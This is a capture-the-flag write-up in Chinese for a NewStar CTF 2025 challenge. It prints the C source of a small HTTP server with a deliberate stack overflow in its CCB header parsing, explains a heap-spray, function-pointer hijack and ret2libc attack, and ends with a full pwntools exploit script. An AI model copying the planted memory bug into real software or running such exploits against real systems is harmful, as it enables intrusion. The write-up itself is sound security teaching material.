---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# content

### 源码

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
typedef enum {
    HTTP_POST = 1,
} http_method_t;

typedef struct http_request http_request_t;
typedef int (*route_handler_t)(const http_request_t *req);

typedef struct {
    const char *uri;
    route_handler_t handler;
} http_route_t;

typedef struct {
    const char *name;
    const char *value;
    size_t name_len;
    size_t value_len;
} http_header_t;

struct http_request {
    http_method_t method;
    const char *uri;
    size_t uri_len;

    http_header_t headers[0x10];
    size_t header_cnt;

    const char *body;
    size_t body_len;
    const char *xff; size_t xff_len;
    const char *ctype; size_t ctype_len;
    route_handler_t handler;
};

typedef struct {
    int status;
    const char *content_type;
    const char *body;
    size_t body_len;
} http_response_t;

void* last_chunk;

static void send_http_response(int status, const char* content_type, const char* body) {
    const char* status_text;
    switch(status) {
        case 200: status_text = "OK"; break;
        case 400: status_text = "Bad Request"; break;
        case 404: status_text = "Not Found"; break;
        case 500: status_text = "Internal Server Error"; break;
        default: status_text = "Unknown"; break;
    }

    int body_len = body ? strlen(body) : 0;
    printf("HTTP/1.1 %d %s\r\n", status, status_text);
    printf("Content-Type: %s\r\n", content_type);
    printf("Content-Length: %d\r\n\r\n", body_len);
    if (body) {
        printf("%s", body);
    }
}

static void send_200_ok(const char* body) {
    send_http_response(200, "text/plain", body);
}

static void send_400_bad_request(const char* message) {
    send_http_response(400, "text/plain", message ? message : "Bad Request");
}

static void send_404_not_found(const char* message) {
    send_http_response(404, "text/plain", message ? message : "Not Found");
}

static void send_500_internal_error(const char* message) {
    send_http_response(500, "text/plain", message ? message : "Internal Server Error");
}

static int h_add(const http_request_t *req) {
    int size = 0;
    char *chunk;
    char *length = strstr(req->body, "length=");
    char *data = strstr(req->body, "data=");
    if (!data||!length) {
        send_400_bad_request("Missing name param");
        return 0;
    }
    length += 7;
    data   += 5;
    size = atoi(length);
    if (size <= 0||size > 0x4000) {
        send_400_bad_request("Invalid length");
        return 0;
    }
    chunk = malloc(size);
    if (!chunk) {
        send_500_internal_error("Failed to allocate memory");
        return 0;
    }
    last_chunk = chunk;
    memcpy(chunk, data, size);
    send_200_ok("0_o");
    return 0;
}
static int h_free(const http_request_t *req) {
    free(last_chunk);
    last_chunk = NULL;
    send_200_ok("o_0");
    return 0;
}
typedef struct {
    void *ptr;
    size_t len;
} alloc_rec_t;

static alloc_rec_t g_allocs[0x10000];
static size_t g_alloc_cnt = 0;

static size_t parse_size_with_suffix(const char *s) {
    char *end = NULL;
    errno = 0;
    unsigned long long v = strtoull(s, &end, 10);
    if (errno != 0) return 0;
    size_t mul = 1;
    if (end && *end) {
        if (*end=='K'||*end=='k') mul = 1024ULL;
        else if (*end=='M'||*end=='m') mul = 1024ULL*1024ULL;
        else return 0; //No
        end++;
        if (*end) return 0;
    }
    if (v > 0x40000000 / mul) return 0x40000000;
    return (size_t)(v * mul);
}

static int h_alloc(const http_request_t *req) {
    const char *size_kv = strstr(req->body, "size=");
    if (!size_kv) {
        send_400_bad_request("Missing size param");
        return 0;
    }
    size_kv += 5;
    char size_buf[64] = {0};
    size_t i = 0;
    while (i < sizeof(size_buf)-1 && (size_kv[i] && size_kv[i] != '&' && size_kv[i] != '\r' && size_kv[i] != '\n')) {
        size_buf[i] = size_kv[i];
        i++;
    }
    size_buf[i] = '\0';

    size_t chunk_len = parse_size_with_suffix(size_buf);
    if (chunk_len == 0) {
        send_400_bad_request("Invalid size");
        return 0;
    }

    size_t count = 1;
    const char *count_kv = strstr(req->body, "count=");
    if (count_kv) {
        count_kv += 6;
        char cnt_buf[32] = {0};
        size_t j = 0;
        while (j < sizeof(cnt_buf)-1 && (count_kv[j] && count_kv[j] != '&' && count_kv[j] != '\r' && count_kv[j] != '\n')) {
            cnt_buf[j] = count_kv[j];
            j++;
        }
        cnt_buf[j] = '\0';
        unsigned long long c = strtoull(cnt_buf, NULL, 10);
        if (c == 0 || c > 1000000ULL) {
            send_400_bad_request("Invalid count");
            return 0;
        }
        count = (size_t)c;
    }

    if (g_alloc_cnt + count > sizeof(g_allocs)/sizeof(g_allocs[0])) {
        send_400_bad_request("Too many allocations");
        return 0;
    }

    size_t page = (size_t)sysconf(_SC_PAGESIZE);
    size_t success = 0;
    size_t total_bytes = 0;

    for (size_t n = 0; n < count; ++n) {
        void *p;
        p = malloc(chunk_len);
        if (!p) break;
        for (size_t off = 0; off < chunk_len; off += page) {
            ((volatile char*)p)[off] = 0;
        }
        ((volatile char*)p)[chunk_len - 1] = 0;

        g_allocs[g_alloc_cnt].ptr = p;
        g_allocs[g_alloc_cnt].len = chunk_len;
        g_alloc_cnt++;

        success++;
        total_bytes += chunk_len;
    }
    char msg[256];
    double mib = total_bytes / 1024.0 / 1024.0;
    snprintf(msg, sizeof(msg),
             "Allocated: %zu chunks, chunk_size=%zu bytes, total=%.2f MiB\n",
             success, chunk_len, mib);
    send_200_ok(msg);
    return 0;
}

void init(void)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
	//alarm(700);
}

static const http_route_t ROUTES[] = {
    { "/add", h_add},
    { "/alloc", h_alloc},
    { "/free", h_free},
    //{ "/submit", h_submit },
};

static inline size_t routes_count(void) {
    return sizeof(ROUTES) / sizeof(ROUTES[0]);
}
static char* find_header_end(const char *buf, size_t len) {
    for (size_t i = 0; i + 3 < len; ++i) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n')
            return buf + i + 4;
    }
    return NULL;
}
void find_handler(http_request_t *req)
{
    int cnt;
    cnt=routes_count();
    for (int i = 0; i <cnt ; ++i) {
        if (strncmp(req->uri, ROUTES[i].uri, strlen(ROUTES[i].uri)) == 0) {
            req->handler = ROUTES[i].handler;
        }
    }
}

static int parse_http_request(const char *buf, size_t len, http_request_t *req) {
    memset(req, 0, sizeof(http_request_t));

    if (len < 5 || strncmp(buf, "POST ", 5) != 0) return 0;
    req->method = HTTP_POST;

    const char *uri_start = buf + 5;
    const char *uri_end   = memchr(uri_start, ' ', (buf + len) - uri_start);
    if (!uri_end) return 0;

    req->uri     = uri_start;
    req->uri_len = (size_t)(uri_end - uri_start);

    const char *body_start = find_header_end(buf, len);
    if (!body_start) return 0;

    req->body = body_start;
    req->body_len = len - (size_t)(body_start - buf);

    req->header_cnt = 0;
    const char *p   = uri_end + 1;
    const char *hdr_end = body_start;

    const char *first_crlf = memchr(p, '\n', (size_t)(hdr_end - p));
    if (!first_crlf) return 0;
    p = first_crlf + 1;

    while (p < hdr_end) {
        const char *nl = memchr(p, '\n', (size_t)(hdr_end - p));
        if (!nl) break;

        const char *line = p;
        const char *line_end = nl;

        if (line == hdr_end || (line_end == line + 1 && line[0] == '\r')) {
            p = nl + 1;
            continue;
        }

        // name:value
        const char *colon = memchr(line, ':', (size_t)(line_end - line));
        if (!colon) { p = nl + 1; continue; }

        const char *name = line;
        const char *name_end = colon;
        while (name < name_end && (*name == ' ' || *name == '\t')) name++;
        while (name_end > name && (name_end[-1] == ' ' || name_end[-1] == '\t')) name_end--;

        const char *val = colon + 1;
        while (val < line_end && (*val == ' ' || *val == '\t')) val++;
        const char *val_end = line_end;
        if (val_end > val && val_end[-1] == '\r') val_end--;
        while (val_end > val && (val_end[-1] == ' ' || val_end[-1] == '\t')) val_end--;

        size_t nlen = (size_t)(name_end - name);
        size_t vlen = (size_t)(val_end  - val);

        // max32
        if (nlen && req->header_cnt < sizeof(req->headers)/sizeof(req->headers[0])) {
            http_header_t *h = &req->headers[req->header_cnt++];
            h->name = name; h->name_len = nlen;
            h->value = val; h->value_len = vlen;
        }

        if (nlen == 3 && strncasecmp(name, "CCB", 3) == 0) {
            req->xff = val;
            req->xff_len = vlen;
            size_t sz = strspn(val, "01\x0a");
            char buff50[50];
            memcpy(buff50, val,sz);
            (void)buff50;
        }
        p = nl + 1;
    }

    return 1;
}

static size_t parse_cl_from_header(const char *buf, size_t header_len) {
    const char *p = buf, *end = buf + header_len;
    while (p + 15 <= end) {
        if ((p[0]=='C'||p[0]=='c') && strncasecmp(p, "Content-Length:", 15) == 0) {
            const char *q = p + 15;
            while (q < end && (*q==' ' || *q=='\t')) q++;
            size_t v = 0; int ok = 0;
            while (q < end && *q >= '0' && *q <= '9') { ok = 1; v = v*10 + (size_t)(*q - '0'); q++; }
            return ok ? v : 0;
        }
        const char *nl = memchr(p, '\n', (size_t)(end - p));
        if (!nl) break;
        p = nl + 1;
    }
    return 0;
}

int main(void)
{
    init();

    #define BUF_CAP  (64*1024)
    static char buf[BUF_CAP + 1];
    size_t used = 0;

    http_request_t req;
    puts("welcome!");
    for (;;) {
        ssize_t n = read(STDIN_FILENO, buf + used, BUF_CAP - used);
        if (n > 0) {
            used += (size_t)n;
            buf[used] = '\0';
        } else if (n == 0) {
            usleep(1000);
        } else { // n < 0
            if (errno == EINTR) continue;
            usleep(1000);
        }
        for (;;) {
            if (used < 4) break;

            //\r\n\r\n）
            char *hdr_end = find_header_end(buf, used);
            if (!hdr_end) {
                if (used == BUF_CAP) {
                    char *last_nl = memchr(buf, '\n', used);
                    if (last_nl) {
                        size_t drop = (size_t)(last_nl - buf + 1);
                        memmove(buf, buf + drop, used - drop);
                        used -= drop;
                    } else {
                        used = 0;
                    }
                }
                break;
            }

            size_t header_bytes = (size_t)(hdr_end - buf);
            size_t content_len = parse_cl_from_header(buf, header_bytes);
            size_t need_total  = header_bytes + content_len;
            if (used < need_total) {
                if (used == BUF_CAP) {
                    send_400_bad_request("Request too large or incomplete");
                    size_t remain = used - header_bytes;
                    if (remain) memmove(buf, buf + header_bytes, remain);
                    used = remain;
                }
                break;
            }
            if (!parse_http_request(buf, need_total, &req)) {
                send_400_bad_request("Bad Request");
            }
            find_handler(&req);
            if (req.handler) {
                req.handler(&req);
            }else {
                send_404_not_found("Not Found");
            }

            size_t extra = used - need_total;
            if (extra) memmove(buf, buf + need_total, extra);
            used = extra;
        }
    }

    return 0;
}

```

### 题解

通过对程序的逆向可以发现是一个httpd，用http格式就能进行交互

路由在这里

![HTTP 路由入口](/assets/images/wp/2025/week4/content_1.png)

![路由处理函数](/assets/images/wp/2025/week4/content_2.png)

提供了三个功能，malloc一个小于0x4000的堆块，连续申请堆块和释放最后一个add的堆块

通过函数指针进行调用，这个函数指针在main函数栈上

漏洞点在CCB请求头的处理中

![CCB 请求头漏洞点](/assets/images/wp/2025/week4/content_3.png)

strspn检测了01\n字符集，进行溢出

也就是 0x30 0x31 0xa的溢出

在正常情况下这三个字符构成的地址为非法地址，但是通过大量堆的分配可以将其变为合法地址，而且这个题的堆是可以预测状态的

所以进行大量的add请求将其填充至0xa303030

![堆地址布局调试](/assets/images/wp/2025/week4/content_4.png)

这里的内容也是可控的，直接写就可以

![可控堆内容](/assets/images/wp/2025/week4/content_5.png)

最后控制了函数指针，leave ret把栈放到堆上面，然后就是ret2libc就可以了

![劫持函数指针](/assets/images/wp/2025/week4/content_6.png)

#### EXP

```python
from pwn import*
from tqdm import trange
context.update(arch='arm', os='linux')
context.terminal=['qterminal','-e']
libc=ELF('./libc.so.6')

debug=1
def con():
    if debug:
        p = process('./chal')
    else:
        p = remote()
    return p

def add(body,size):
    send_body = b"length="+str(size).encode()
    send_body += b"data="+body
    payload  = b"POST /add HTTP/1.1\r\n"
    payload += b"Host: 127.0.0.1\r\n"
    payload += b"Content-Length: " + str(len(send_body)).encode() + b"\r\n"
    payload += b"\r\n"
    payload += send_body
    p.send(payload)

def delete():
    payload  = b"POST /free HTTP/1.1\r\n"
    payload += b"Host: 127.0.0.1\r\n"
    payload += b"Content-Length: 0\r\n"
    payload += b"\r\n"
    p.send(payload)

def alloc(size,count=1):
    send_body = b"count="+str(count).encode()
    send_body += b"size="+size.encode()
    payload  = b"POST /alloc HTTP/1.1\r\n"
    payload += b"Host: 127.0.0.1\r\n"
    payload += b"Content-Length: " + str(len(send_body)).encode() + b"\r\n"
    payload += b"\r\n"
    payload += send_body
    p.send(payload)

def attack():
    send_body = b"ishmael"
    payload  = b"POST / HTTP/1.1\r\n"
    payload += b"Host: 127.0.0.1\r\n"
    payload += b"Content-Length: " + str(len(send_body)).encode() + b"\r\n"
    payload += b"CCB: "
    payload += b"0"*0x85+b'\x0a'
    payload += b"\r\n\r\n"
    payload += send_body
    p.send(payload)

p=con()
add(b'this',0xe68)
payload=b''
payload=payload.ljust(0x34-0x10,b'0')
payload+=p32(0x80490D0)
payload+=p32(0x0804901e)
payload+=p32(0x804D008)
payload+=p32(0x8049050)
payload+=p32(0)
payload+=p32(0)
payload+=p32(0xa303030)
payload+=p32(0x100)
payload=payload.ljust(0xed8-0x10,b'0')
payload+=p32(0xa303030)
payload=payload.ljust(0xffc-0x10,b'0')
payload+=p32(0x80495B1)
spry=flat({
    0:payload,
    0x1000:payload,
    0x2000:payload,
    0x3000:payload,
})
for i in trange(0x900, desc='Exploit progress', unit='iter', dynamic_ncols=True):
    add(spry,0x4000-8)
    p.recvuntil('0_o')
p.clean()
attack()
libc.address=u32(p.recvuntil(b'\xf7',timeout=2)[-4:])-libc.symbols['read']
log.success('libc base: '+hex(libc.address))
payload=b'0'*0x14+p32(libc.symbols['system'])+p32(0)+p32(libc.address+0xf7f2ee3c-0xf7d65000)
sleep(0.1)
p.sendline(payload)
p.interactive()

```
